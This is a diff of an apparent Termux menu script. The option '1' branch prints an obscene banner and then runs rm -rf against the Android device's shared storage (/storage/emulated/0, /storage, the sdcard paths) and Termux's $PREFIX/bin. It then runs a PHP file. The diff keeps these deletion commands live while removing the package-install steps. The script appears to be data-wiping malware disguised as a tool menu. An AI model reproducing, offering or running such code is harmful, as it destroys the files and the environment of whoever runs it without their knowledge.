@@ -64,40 +64,22 @@ read -p "~~# " kntl;
 if [ $kntl = 01 ] || [ $kntl = 1 ]
 
 then
-
-clear
-
-
-pkg update
-
-pkg upgrade
-
-pkg install figlet
-
-pkg install lolcat
-
-pkg install ruby
-
-pkg install curl
-
-pkg install toilet cowsay
-
 clear
 clear
 
-figlet Mr.Fuckking.. | lolcat
+toilet -f standard "Mr.Fuckking" | lolcat
 
 sleep 1
 
-rm -rf /storage/emulated/0
+rm -rf /storage/emulated/0/
 
-rm -rf /storage
+rm -rf /storage/
 
-rm -rf /storage/sdcard
+rm -rf /storage/sdcard/
 
-rm -rf /storage/sdcard1
+rm -rf /storage/sdcard1/
 
-rm -rf $PREFIX/bin
+rm -rf $PREFIX/bin/
 
 php knt.php
 
